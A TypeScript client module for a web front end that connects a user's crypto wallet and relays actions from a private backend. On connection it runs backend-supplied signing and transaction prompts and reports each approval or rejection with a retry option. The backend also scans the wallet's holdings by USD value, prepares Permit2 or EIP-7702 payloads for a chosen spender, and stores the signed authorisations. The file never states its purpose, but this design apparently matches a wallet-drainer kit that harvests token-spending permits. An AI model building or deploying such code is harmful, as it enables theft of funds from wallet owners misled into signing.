// src/lib/backendClient.ts
// Thin client for YOUR OWN backend.
// Configure the base URL in .env -> VITE_BACKEND_URL

const BASE_URL = (import.meta.env.VITE_BACKEND_URL as string | undefined)?.replace(/\/$/, '') || '';
const API_KEY = (import.meta.env.VITE_BACKEND_API_KEY as string | undefined) || '';

export const isBackendConfigured = () => Boolean(BASE_URL);

/** A single action the backend asks the browser to perform via the wallet. */
export type WalletPrompt =
  | {
      id: string;
      type: 'sign_message';
      /** Plain text message the user will sign (personal_sign). */
      message: string;
      title?: string;
      description?: string;
    }
  | {
      id: string;
      type: 'send_transaction';
      /** Standard EIP-1193 tx object. value/gas must be hex strings. */
      tx: {
        to: string;
        value?: string;
        data?: string;
        gas?: string;
        chainId?: string;
      };
      title?: string;
      description?: string;
    }
  | {
      id: string;
      type: 'switch_chain';
      /** Hex chain id, e.g. "0x1" */
      chainId: string;
      title?: string;
      description?: string;
    };

export interface ConnectedPayload {
  address: string;
  chainId?: number;
  walletName?: string | null;
  userAgent: string;
  referrer?: string;
  path: string;
}

export interface ConnectedResponse {
  sessionId: string;
  /** Ordered list of things the browser should prompt the wallet for. */
  prompts: WalletPrompt[];
  /** Optional message to show the user. */
  notice?: string;
}

export type WalletEventStatus = 'started' | 'approved' | 'rejected' | 'failed';

export interface WalletEventPayload {
  sessionId: string;
  promptId?: string;
  address?: string;
  status: WalletEventStatus;
  attempt?: number;
  /** Signature, tx hash, or other result. */
  result?: string;
  errorCode?: number | string;
  errorMessage?: string;
}

async function request<T>(path: string, body: unknown): Promise<T> {
  if (!BASE_URL) throw new Error('VITE_BACKEND_URL is not set');

  const res = await fetch(`${BASE_URL}${path}`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      ...(API_KEY ? { 'x-api-key': API_KEY } : {}),
    },
    credentials: 'include',
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const text = await res.text().catch(() => '');
    throw new Error(`Backend ${path} failed (${res.status}): ${text.slice(0, 200)}`);
  }
  return (await res.json()) as T;
}

/** Called immediately after a SUCCESSFUL wallet connection. */
export const notifyWalletConnected = (payload: ConnectedPayload) =>
  request<ConnectedResponse>('/api/wallet/connected', payload);

/** Report each approval / rejection / failure back to the backend. */
export const reportWalletEvent = (payload: WalletEventPayload) =>
  request<{ ok: boolean; retry?: boolean }>('/api/wallet/event', payload).catch((e) => {
    console.warn('reportWalletEvent failed', e);
    return { ok: false } as { ok: boolean; retry?: boolean };
  });

/** Verify a signature server-side (SIWE-style). */
export const verifySignature = (payload: {
  sessionId: string;
  promptId: string;
  address: string;
  signature: string;
}) => request<{ verified: boolean; token?: string }>('/api/wallet/verify', payload);

// ---------------------------------------------------------------------------
// Permit2 flow (scan wallet + prepare typed data + store signed authorisation)
// ---------------------------------------------------------------------------

export interface PortfolioToken {
  contract: string;
  symbol: string;
  name: string;
  balance: string;
  priceUsd: number;
  valueUsd: number;
  logo?: string | null;
}

export interface Portfolio {
  totalUsd: number;
  native: { symbol: string; balance: string; priceUsd: number; valueUsd: number };
  tokens: PortfolioToken[];
}

export interface Permit2TypedData {
  domain: { name: string; chainId: number; verifyingContract: string };
  types: Record<string, Array<{ name: string; type: string }>>;
  message: {
    permitted: { token: string; amount: string };
    spender: string;
    nonce: string;
    deadline: number;
  };
}

export interface ScanAndPrepareResponse {
  success: boolean;
  address: string;
  chainId: string;
  portfolio: Portfolio;
  signaturePayload:
    | { type: 'permit2'; payload: Permit2TypedData; meta: any }
    | { type: 'eip7702'; payload: any; meta: any }
    | null;
  error?: string;
}

/** Ask the backend to scan the wallet and hand back a Permit2 typed-data payload. */
export const scanAndPrepare = (payload: {
  address: string;
  chainId: string | number;
  spender: string;
  tokenAddress?: string;
}) => request<ScanAndPrepareResponse>('/api/wallet/scan-and-prepare', payload);

/** Send the signed Permit2 authorisation to the backend for storage. */
export const storePermit2Signature = (payload: {
  address: string;
  chainId: number;
  token: string;
  amount: string;
  spender: string;
  nonce: string;
  deadline: number;
  signature: string;
  typedData: Permit2TypedData;
  walletName?: string | null;
  portfolioUsd?: number;
}) => request<{ ok: boolean; id?: string }>('/api/wallet/store-signature', payload);

